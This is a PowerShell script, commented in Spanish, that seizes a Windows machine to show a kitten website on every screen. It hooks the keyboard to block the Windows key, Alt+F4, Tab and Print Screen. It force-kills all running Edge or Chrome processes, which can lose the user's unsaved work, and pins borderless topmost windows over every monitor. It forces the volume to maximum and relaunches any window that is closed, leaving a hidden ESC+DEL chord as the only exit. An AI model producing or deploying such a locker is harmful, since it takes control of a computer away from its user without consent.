<#
  run.ps1 - Gatitos en TODAS las pantallas (versión anti-cierre)
  Única salida: ESC + DEL
#>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$pageUrl = 'https://gatitos-eight.vercel.app'
$basePerfil = Join-Path $env:TEMP 'venice_kiosk'

# ---------------- Bloqueo de teclas + ESC+DEL ----------------
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class KeyBlocker {
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 0x0100;
  private const int WM_SYSKEYDOWN = 0x0104;
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;

  public static long lastEsc = 0;
  public static long lastDel = 0;
  public static bool shouldExit = false;

  public static void Start() { _hookID = SetHook(_proc); }
  public static void Stop()  { UnhookWindowsHookEx(_hookID); }

  private static IntPtr SetHook(LowLevelKeyboardProc proc) {
    using (Process curProcess = Process.GetCurrentProcess())
    using (ProcessModule curModule = curProcess.MainModule) {
      return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }
  }

  private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
      int vk = Marshal.ReadInt32(lParam);
      long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

      if (vk == 0x1B) { lastEsc = now; if (now - lastDel < 700) shouldExit = true; }
      if (vk == 0x2E) { lastDel = now; if (now - lastEsc < 700) shouldExit = true; }

      if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C) {
        return (IntPtr)1;
      }
    }
    return CallNextHookEx(_hookID, nCode, wParam, lParam);
  }

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@

# ---------------- Volumen ----------------
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDevEnum { }
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int _1(); int GetDefaultAudioEndpoint(int flow, int role, out IMMDevice dev); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice { int Activate(ref Guid iid, int ctx, IntPtr p, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
  int _1(); int _2(); int _3();
  int SetMasterVolumeLevel(float f, IntPtr c);
  int SetMasterVolumeLevelScalar(float f, IntPtr c);
  int GetMasterVolumeLevel(out float f);
  int GetMasterVolumeLevelScalar(out float f);
  int _8(); int _9(); int _10(); int _11();
  int SetMute(int m, IntPtr c);
  int GetMute(out int m);
}
public static class Vol {
  static IAudioEndpointVolume V() {
    var e = (IMMDeviceEnumerator)(new MMDevEnum());
    IMMDevice d; e.GetDefaultAudioEndpoint(0, 1, out d);
    Guid iid = typeof(IAudioEndpointVolume).GUID;
    object o; d.Activate(ref iid, 1, IntPtr.Zero, out o);
    return (IAudioEndpointVolume)o;
  }
  public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
}
'@

# ---------------- API ventanas (más completa) ----------------
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class WinAPI {
  public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
  public const uint SWP_SHOWWINDOW = 0x0040;
  public const uint SWP_FRAMECHANGED = 0x0020;
  public const int GWL_STYLE = -16;
  public const int GWL_EXSTYLE = -20;
  public const int WS_CAPTION = 0x00C00000;
  public const int WS_THICKFRAME = 0x00040000;
  public const int WS_BORDER = 0x00800000;
  public const int WS_SYSMENU = 0x00080000;
  public const int WS_MINIMIZEBOX = 0x00020000;
  public const int WS_MAXIMIZEBOX = 0x00010000;
  public const int WS_EX_TOPMOST = 0x00000008;
  public const int WS_EX_TOOLWINDOW = 0x00000080;

  [DllImport("user32.dll")]
  public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

  [DllImport("user32.dll")]
  public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

  [DllImport("user32.dll")]
  public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

  [DllImport("user32.dll")]
  public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  public const int SW_SHOW = 5;
}
'@

Add-Type -AssemblyName System.Windows.Forms
$screens = [System.Windows.Forms.Screen]::AllScreens
$primary = [System.Windows.Forms.Screen]::PrimaryScreen

function Get-Nav {
  $c = @(
    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
    "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
  )
  foreach ($p in $c) { if (Test-Path $p) { return $p } }
  return $null
}

$nav = Get-Nav
if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
$procName = [IO.Path]::GetFileNameWithoutExtension($nav)

$script:windowMap = @{}

function ForzarFullscreen($hwnd, $screen) {
  if ($hwnd -eq [IntPtr]::Zero) { return }

  # Quitar TODOS los bordes y controles
  $style = [WinAPI]::GetWindowLong($hwnd, [WinAPI]::GWL_STYLE)
  $style = $style -band (-bnot [WinAPI]::WS_CAPTION)
  $style = $style -band (-bnot [WinAPI]::WS_THICKFRAME)
  $style = $style -band (-bnot [WinAPI]::WS_BORDER)
  $style = $style -band (-bnot [WinAPI]::WS_SYSMENU)
  $style = $style -band (-bnot [WinAPI]::WS_MINIMIZEBOX)
  $style = $style -band (-bnot [WinAPI]::WS_MAXIMIZEBOX)
  [WinAPI]::SetWindowLong($hwnd, [WinAPI]::GWL_STYLE, $style) | Out-Null

  # Forzar topmost
  $exStyle = [WinAPI]::GetWindowLong($hwnd, [WinAPI]::GWL_EXSTYLE)
  $exStyle = $exStyle -bor [WinAPI]::WS_EX_TOPMOST
  [WinAPI]::SetWindowLong($hwnd, [WinAPI]::GWL_EXSTYLE, $exStyle) | Out-Null

  # Cubrir TODA la pantalla (incluyendo barra de tareas)
  [WinAPI]::SetWindowPos(
    $hwnd,
    [WinAPI]::HWND_TOPMOST,
    $screen.Bounds.X,
    $screen.Bounds.Y,
    $screen.Bounds.Width,
    $screen.Bounds.Height,
    [WinAPI]::SWP_SHOWWINDOW -bor [WinAPI]::SWP_FRAMECHANGED
  ) | Out-Null

  [WinAPI]::ShowWindow($hwnd, [WinAPI]::SW_SHOW) | Out-Null
}

function LanzarSecundaria($screen, $index) {
  $perfil = "$basePerfil`_sec_$index"
  $x = $screen.Bounds.X
  $y = $screen.Bounds.Y
  $w = $screen.Bounds.Width
  $h = $screen.Bounds.Height

  $flags = "--new-window --app=`"$pageUrl`" --user-data-dir=`"$perfil`" " +
           "--no-first-run --disable-session-crashed-bubble --disable-infobars " +
           "--autoplay-policy=no-user-gesture-required " +
           "--window-position=$x,$y --window-size=$w,$h"

  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
  if ($p) {
    $script:windowMap[$p.Id] = @{ Screen = $screen; IsPrimary = $false }
    return $p.Id
  }
  return 0
}

function LanzarPrincipal {
  $perfil = "$basePerfil`_main"
  $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
           "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
           "--autoplay-policy=no-user-gesture-required --disable-infobars"
  if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }

  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
  if ($p) {
    $script:windowMap[$p.Id] = @{ Screen = $primary; IsPrimary = $true }
  }
}

function LanzarTodo {
  # Cerrar todo
  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  Start-Sleep -Milliseconds 600
  $script:windowMap = @{}

  # 1. Primero la principal (kiosk)
  LanzarPrincipal
  Start-Sleep -Milliseconds 1000

  # 2. Luego las secundarias
  $index = 0
  foreach ($screen in $screens) {
    if ($screen.DeviceName -eq $primary.DeviceName) { continue }
    $index++
    LanzarSecundaria $screen $index
    Start-Sleep -Milliseconds 900
  }

  # 3. Forzar fullscreen de secundarias muchas veces
  for ($t = 1; $t -le 15; $t++) {
    Start-Sleep -Milliseconds 300
    foreach ($pid in @($script:windowMap.Keys)) {
      $info = $script:windowMap[$pid]
      if (-not $info.IsPrimary) {
        $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
        if ($proc -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
          ForzarFullscreen $proc.MainWindowHandle $info.Screen
        }
      }
    }
  }
}

# ========== INICIO ==========
[KeyBlocker]::Start()
LanzarTodo

try {
  while ($true) {
    if ([KeyBlocker]::shouldExit) { break }

    [Vol]::Set(1.0)

    # Re-forzar secundarias constantemente (evita que vuelva la barra)
    foreach ($pid in @($script:windowMap.Keys)) {
      $info = $script:windowMap[$pid]
      if (-not $info.IsPrimary) {
        $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
        if ($proc -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
          ForzarFullscreen $proc.MainWindowHandle $info.Screen
        }
      }
    }

    # ¿Falta alguna ventana?
    $vivos = 0
    $faltanSecundarias = $false
    $primaryViva = $false

    foreach ($pid in @($script:windowMap.Keys)) {
      if (Get-Process -Id $pid -ErrorAction SilentlyContinue) {
        $vivos++
        if ($script:windowMap[$pid].IsPrimary) { $primaryViva = $true }
      } else {
        if (-not $script:windowMap[$pid].IsPrimary) { $faltanSecundarias = $true }
      }
    }

    $totalNecesario = $screens.Count
    if ($vivos -lt $totalNecesario -or -not $primaryViva) {
      LanzarTodo
    }

    Start-Sleep -Milliseconds 100
  }
}
finally {
  [KeyBlocker]::Stop()
  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}